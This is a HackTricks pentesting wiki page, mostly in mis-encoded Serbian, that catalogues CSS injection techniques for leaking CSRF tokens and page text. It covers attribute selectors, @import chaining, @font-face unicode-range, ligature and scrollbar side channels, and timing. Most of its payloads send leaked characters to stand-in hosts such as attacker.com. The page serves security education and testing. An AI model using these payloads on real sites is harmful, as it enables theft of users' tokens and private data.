# CSS Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## CSS Injection

### Attribute Selector

CSS selektori su napravljeni da odgovaraju vrednostima atributa `name` i `value` elementa `input`. Ako atribut vrednosti elementa input poÄinje sa odreÄ‘enim karakterom, uÄitava se unapred definisani spoljaÅ¡nji resurs:
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
MeÄ‘utim, ovaj pristup se suoÄava sa ograniÄenjem kada se radi o skrivenim ulaznim elementima (`type="hidden"`) jer skriveni elementi ne uÄitavaju pozadine.

#### ObilaÅ¾enje za skrivene elemente

Da biste zaobiÅ¡li ovo ograniÄenje, moÅ¾ete ciljati sledeÄ‡i element brata koristeÄ‡i `~` general sibling combinator. CSS pravilo se zatim primenjuje na sve braÄ‡e koja slede skriveni ulazni element, uzrokujuÄ‡i uÄitavanje pozadinske slike:
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
PraktiÄan primer iskoriÅ¡Ä‡avanja ove tehnike detaljno je opisan u priloÅ¾enom kodu. MoÅ¾ete ga pogledati [ovde](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### Preduslovi za CSS Injection

Da bi tehnika CSS Injection bila efikasna, moraju biti ispunjeni odreÄ‘eni uslovi:

1. **DuÅ¾ina Payload-a**: Vektor CSS injekcije mora podrÅ¾avati dovoljno duge payload-ove da bi se prilagodili kreiranim selektorima.
2. **Ponovna evaluacija CSS-a**: Trebalo bi da imate moguÄ‡nost da uokvirite stranicu, Å¡to je neophodno za pokretanje ponovne evaluacije CSS-a sa novim generisanim payload-ima.
3. **Spoljni resursi**: Tehnika pretpostavlja moguÄ‡nost koriÅ¡Ä‡enja slika hostovanih na spoljnim serverima. Ovo moÅ¾e biti ograniÄeno politikom bezbednosti sadrÅ¾aja (CSP) sajta.

### Blind Attribute Selector

Kao Å¡to je [**objaÅ¡njeno u ovom postu**](https://portswigger.net/research/blind-css-exfiltration), moguÄ‡e je kombinovati selektore **`:has`** i **`:not`** da bi se identifikovao sadrÅ¾aj Äak i iz slepih elemenata. Ovo je veoma korisno kada nemate pojma Å¡ta se nalazi unutar web stranice koja uÄitava CSS injekciju.\
TakoÄ‘e je moguÄ‡e koristiti te selektore za ekstrakciju informacija iz nekoliko blokova istog tipa kao u:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
Kombinovanjem ovoga sa sledeÄ‡om **@import** tehnikom, moguÄ‡e je eksfiltrirati mnogo **informacija koristeÄ‡i CSS injekciju sa slepih stranica uz** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

Prethodna tehnika ima neke nedostatke, proverite preduslove. Morate biti u moguÄ‡nosti da **poÅ¡aljete viÅ¡e linkova Å¾rtvi**, ili morate biti u moguÄ‡nosti da **iframe-ujete stranicu ranjivu na CSS injekciju**.

MeÄ‘utim, postoji joÅ¡ jedna pametna tehnika koja koristi **CSS `@import`** da poboljÅ¡a kvalitet tehnike.

Ovo je prvi put prikazano od strane [**Pepe Vila**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf) i funkcioniÅ¡e ovako:

Umesto da uÄitavamo istu stranicu iznova i iznova sa desetinama razliÄitih payload-a svaki put (kao u prethodnoj), uÄitaÄ‡emo **stranicu samo jednom i samo sa importom na server napadaÄa** (ovo je payload koji treba poslati Å¾rtvi):
```css
@import url('//attacker.com:5001/start?');
```
1. Uvoz Ä‡e **primiti neki CSS skript** od napadaÄa i **pregledaÄ Ä‡e ga uÄitati**.
2. Prvi deo CSS skripta koji Ä‡e napadaÄ poslati je **joÅ¡ jedan `@import` na server napadaÄa ponovo.**
1. Server napadaÄa neÄ‡e odgovoriti na ovaj zahtev joÅ¡, jer Å¾elimo da otkrijemo neke karaktere i zatim odgovorimo na ovaj uvoz sa payload-om da otkrijemo sledeÄ‡e.
3. Drugi i veÄ‡i deo payload-a Ä‡e biti **payload za curenje atribut selektora**
1. Ovo Ä‡e poslati serveru napadaÄa **prvi karakter tajne i poslednji.**
4. Kada server napadaÄa primi **prvi i poslednji karakter tajne**, on Ä‡e **odgovoriti na uvoz zatraÅ¾en u koraku 2**.
1. Odgovor Ä‡e biti taÄno isti kao u **koracima 2, 3 i 4**, ali ovaj put Ä‡e pokuÅ¡ati da **pronaÄ‘e drugi karakter tajne i zatim pretposlednji**.

NapadaÄ Ä‡e **slediti tu petlju dok ne uspe potpuno da otkrije tajnu**.

MoÅ¾ete pronaÄ‡i originalni [**kod Pepe Vile za eksploataciju ovde**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) ili moÅ¾ete pronaÄ‡i skoro [**isti kod ali komentarisani ovde**.](./#css-injection)

{% hint style="info" %}
Skript Ä‡e pokuÅ¡ati da otkrije 2 karaktera svaki put (od poÄetka i od kraja) jer atribut selektor omoguÄ‡ava da se rade stvari kao:
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
Ovo omoguÄ‡ava skripti da brÅ¾e otkrije tajnu.  
{% endhint %}

{% hint style="warning" %}
Ponekad skripta **ne detektuje ispravno da je otkriveni prefiks + sufiks veÄ‡ potpuna zastava** i nastaviÄ‡e napred (u prefiksu) i unazad (u sufiksu) i u nekom trenutku Ä‡e se zamrznuti.\
Bez brige, samo proverite **izlaz** jer **moÅ¾ete videti zastavu tamo**.  
{% endhint %}

### Ostali selektori

Ostali naÄini za pristup delovima DOM-a pomoÄ‡u **CSS selektora**:

* **`.class-to-search:nth-child(2)`**: Ovo Ä‡e pretraÅ¾iti drugi element sa klasom "class-to-search" u DOM-u.
*   **`:empty`** selektor: Koristi se na primer u [**ovoj analizi**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### GreÅ¡ka zasnovana XS-Search

**Referenca:** [CSS zasnovan napad: Zloupotreba unicode-range @font-face](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [GreÅ¡ka zasnovana XS-Search PoC od @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

OpÅ¡ta namera je da se **koristi prilagoÄ‘eni font sa kontrolisanog krajnjeg taÄke** i osigura da se **tekst (u ovom sluÄaju, 'A') prikazuje sa ovim fontom samo ako navedeni resurs (`favicon.ico`) ne moÅ¾e biti uÄitan**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **KoriÅ¡Ä‡enje PrilagoÄ‘enih Fontova**:
- PrilagoÄ‘eni font se definiÅ¡e koristeÄ‡i pravilo `@font-face` unutar `<style>` taga u `<head>` sekciji.
- Font se naziva `poc` i preuzima se sa spoljnog krajnjeg taÄke (`http://attacker.com/?leak`).
- Svojstvo `unicode-range` je postavljeno na `U+0041`, cilja specifiÄni Unicode karakter 'A'.

2. **Element Objekta sa Rezervnim Tekstom**:
- `<object>` element sa `id="poc0"` se kreira u `<body>` sekciji. Ovaj element pokuÅ¡ava da uÄita resurs sa `http://192.168.0.1/favicon.ico`.
- `font-family` za ovaj element je postavljen na `'poc'`, kao Å¡to je definisano u `<style>` sekciji.
- Ako resurs (`favicon.ico`) ne uspe da se uÄita, rezervni sadrÅ¾aj (slovo 'A') unutar `<object>` taga se prikazuje.
- Rezervni sadrÅ¾aj ('A') Ä‡e biti prikazan koristeÄ‡i prilagoÄ‘eni font `poc` ako spoljaÅ¡nji resurs ne moÅ¾e da se uÄita.

### Stilizovanje Fragmenta Teksta za Pomeranje

**`:target`** pseudo-klasa se koristi za selektovanje elementa koji je ciljan od strane **URL fragmenta**, kao Å¡to je navedeno u [CSS Selectors Level 4 specification](https://drafts.csswg.org/selectors-4/#the-target-pseudo). KljuÄno je razumeti da `::target-text` ne odgovara nijednom elementu osim ako tekst nije eksplicitno ciljan fragmentom.

Bezbednosna zabrinutost se javlja kada napadaÄi koriste funkciju **Scroll-to-text** fragmenta, omoguÄ‡avajuÄ‡i im da potvrde prisustvo specifiÄnog teksta na veb stranici uÄitavanjem resursa sa svog servera putem HTML injekcije. Metoda ukljuÄuje injektovanje CSS pravila poput ovog:
```css
:target::before { content : url(target.png) }
```
U takvim scenarijima, ako je tekst "Administrator" prisutan na stranici, resurs `target.png` se zahteva sa servera, Å¡to ukazuje na prisustvo teksta. Primer ovog napada moÅ¾e se izvrÅ¡iti putem posebno kreirane URL adrese koja ugraÄ‘uje injektovani CSS zajedno sa fragmentom Scroll-to-text:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Ovde, napad manipuliÅ¡e HTML injekcijom kako bi prenio CSS kod, ciljajuÄ‡i na specifiÄan tekst "Administrator" kroz Scroll-to-text fragment (`#:~:text=Administrator`). Ako se tekst pronaÄ‘e, navedeni resurs se uÄitava, nenamerno signalizirajuÄ‡i svoju prisutnost napadaÄu.

Za ublaÅ¾avanje, sledeÄ‡e taÄke treba imati na umu:

1. **OgraniÄeno STTF podudaranje**: Scroll-to-text Fragment (STTF) je dizajniran da se podudara samo sa reÄima ili reÄenicama, Äime se ograniÄava njegova sposobnost da otkrije proizvoljne tajne ili tokene.
2. **OgraniÄenje na kontekste najviÅ¡eg nivoa pretraÅ¾ivanja**: STTF funkcioniÅ¡e iskljuÄivo u kontekstima najviÅ¡eg nivoa pretraÅ¾ivanja i ne radi unutar iframe-ova, ÄineÄ‡i svaki pokuÅ¡aj eksploatacije uoÄljivijim za korisnika.
3. **Potrebna aktivacija korisnika**: STTF zahteva gest aktivacije korisnika da bi funkcionisao, Å¡to znaÄi da su eksploatacije moguÄ‡e samo kroz navigacije koje inicira korisnik. Ovaj zahtev znaÄajno smanjuje rizik od automatizovanih napada bez interakcije korisnika. Ipak, autor bloga ukazuje na specifiÄne uslove i zaobilaÅ¾enja (npr. socijalno inÅ¾enjerstvo, interakcija sa prisutnim ekstenzijama pretraÅ¾ivaÄa) koja bi mogla olakÅ¡ati automatizaciju napada.

Svest o ovim mehanizmima i potencijalnim ranjivostima je kljuÄna za odrÅ¾avanje bezbednosti veba i zaÅ¡titu od ovakvih eksploatativnih taktika.

Za viÅ¡e informacija proverite izvorni izveÅ¡taj: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

MoÅ¾ete proveriti [**eksploit koristeÄ‡i ovu tehniku za CTF ovde**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

MoÅ¾ete odrediti **spoljaÅ¡nje fontove za specifiÄne unicode vrednosti** koje Ä‡e biti **prikupljene samo ako su te unicode vrednosti prisutne** na stranici. Na primer:
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
When you access this page, Chrome and Firefox fetch "?A" and "?B" because text node of sensitive-information contains "A" and "B" characters. But Chrome and Firefox do not fetch "?C" because it does not contain "C". This means that we have been able to read "A" and "B".

### Text node exfiltration (I): ligatures <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Reference:** [Wykradanje podataka u sjajnom stilu â€“ odnosno kako iskoristiti CSS za napade na web aplikaciju](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

The technique described involves extracting text from a node by exploiting font ligatures and monitoring changes in width. The process involves several steps:

1. **Creation of Custom Fonts**:
- SVG fonts are crafted with glyphs having a `horiz-adv-x` attribute, which sets a large width for a glyph representing a two-character sequence.
- Example SVG glyph: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, where "XY" denotes a two-character sequence.
- These fonts are then converted to woff format using fontforge.

2. **Detection of Width Changes**:
- CSS is used to ensure that text does not wrap (`white-space: nowrap`) and to customize the scrollbar style.
- The appearance of a horizontal scrollbar, styled distinctly, acts as an indicator (oracle) that a specific ligature, and hence a specific character sequence, is present in the text.
- The CSS involved:
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **Exploit Process**:
- **Step 1**: Fonts are created for pairs of characters with substantial width.
- **Step 2**: A scrollbar-based trick is employed to detect when the large width glyph (ligature for a character pair) is rendered, indicating the presence of the character sequence.
- **Step 3**: Upon detecting a ligature, new glyphs representing three-character sequences are generated, incorporating the detected pair and adding a preceding or succeeding character.
- **Step 4**: Detection of the three-character ligature is carried out.
- **Step 5**: The process repeats, progressively revealing the entire text.

4. **Optimization**:
- The current initialization method using `<meta refresh=...` is not optimal.
- A more efficient approach could involve the CSS `@import` trick, enhancing the exploit's performance.

### Text node exfiltration (II): leaking the charset with a default font (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** [PoC koristeÄ‡i Comic Sans od @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

This trick was released in this [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/). The charset used in a text node can be leaked **using the default fonts** installed in the browser: no external -or custom- fonts are needed.

The concept revolves around utilizing an animation to incrementally expand a `div`'s width, allowing one character at a time to transition from the 'suffix' part of the text to the 'prefix' part. This process effectively splits the text into two sections:

1. **Prefix**: The initial line.
2. **Suffix**: The subsequent line(s).

The transition stages of the characters would appear as follows:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**


During this transition, the **unicode-range trick** is employed to identify each new character as it joins the prefix. This is achieved by switching the font to Comic Sans, which is notably taller than the default font, consequently triggering a vertical scrollbar. This scrollbar's appearance indirectly reveals the presence of a new character in the prefix.

Although this method allows the detection of unique characters as they appear, it does not specify which character is repeated, only that a repetition has occurred.

{% hint style="info" %}
Basically, the **unicode-range is used to detect a char**, but as we don't want to load an external font, we need to find another way.\
When the **char** is **found**, it's **given** the pre-installed **Comic Sans font**, which **makes** the char **bigger** and **triggers a scroll bar** which will **leak the found char**.
{% endhint %}

Check the code extracted from the PoC:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Ekstrakcija tekstualnog Ävora (III): curenje charset-a sa podrazumevanjem fonta skrivajuÄ‡i elemente (ne zahteva spoljne resurse) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** Ovo je pomenuto kao [neuspeÅ¡no reÅ¡enje u ovom izveÅ¡taju](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Ovaj sluÄaj je veoma sliÄan prethodnom, meÄ‘utim, u ovom sluÄaju cilj pravljenja specifiÄnih **karaktera veÄ‡im od drugih je da se sakrije neÅ¡to** poput dugmeta koje ne bi trebalo da bude pritisnuto od strane bota ili slike koja se neÄ‡e uÄitati. Tako bismo mogli meriti akciju (ili nedostatak akcije) i znati da li je specifiÄan karakter prisutan unutar teksta.

### Ekstrakcija tekstualnog Ävora (III): curenje charset-a putem vremenskog keÅ¡iranja (ne zahteva spoljne resurse) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** Ovo je pomenuto kao [neuspeÅ¡no reÅ¡enje u ovom izveÅ¡taju](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

U ovom sluÄaju, mogli bismo pokuÅ¡ati da curimo da li je karakter u tekstu uÄitavanjem laÅ¾nog fonta iz iste domene:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
Ako postoji podudaranje, **font Ä‡e biti uÄitan sa `/static/bootstrap.min.css?q=1`**. Iako se neÄ‡e uÄitati uspeÅ¡no, **pregledaÄ bi trebao da ga keÅ¡ira**, i Äak i ako nema keÅ¡a, postoji **304 not modified** mehanizam, tako da bi **odgovor trebao biti brÅ¾i** od drugih stvari.

MeÄ‘utim, ako razlika u vremenu izmeÄ‘u keÅ¡iranog odgovora i onog koji nije keÅ¡iran nije dovoljno velika, ovo neÄ‡e biti korisno. Na primer, autor je pomenuo: MeÄ‘utim, nakon testiranja, otkrio sam da je prvi problem to Å¡to se brzina ne razlikuje mnogo, a drugi problem je Å¡to bot koristi `disk-cache-size=1` flag, Å¡to je zaista promiÅ¡ljeno.

### Ekstrakcija tekstualnog Ävora (III): curenje charset-a vremenskim uÄitavanjem stotina lokalnih "fontova" (ne zahteva spoljne resurse) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** Ovo se pominje kao [neuspeÅ¡no reÅ¡enje u ovom izveÅ¡taju](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

U ovom sluÄaju moÅ¾ete naznaÄiti **CSS da uÄita stotine laÅ¾nih fontova** sa iste domene kada doÄ‘e do podudaranja. Na ovaj naÄin moÅ¾ete **meriti vreme** koje je potrebno i otkriti da li se karakter pojavljuje ili ne sa neÄim poput:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
I kod bota izgleda ovako:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
Dakle, ako se font ne poklapa, oÄekuje se da Ä‡e vreme odgovora prilikom posete botu biti otprilike 30 sekundi. MeÄ‘utim, ako doÄ‘e do poklapanja fonta, biÄ‡e poslato viÅ¡e zahteva za preuzimanje fonta, Å¡to Ä‡e uzrokovati kontinuiranu aktivnost mreÅ¾e. Kao rezultat toga, biÄ‡e potrebno viÅ¡e vremena da se zadovolji uslov zaustavljanja i primi odgovor. Stoga se vreme odgovora moÅ¾e koristiti kao indikator za odreÄ‘ivanje da li postoji poklapanje fonta.

## References

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
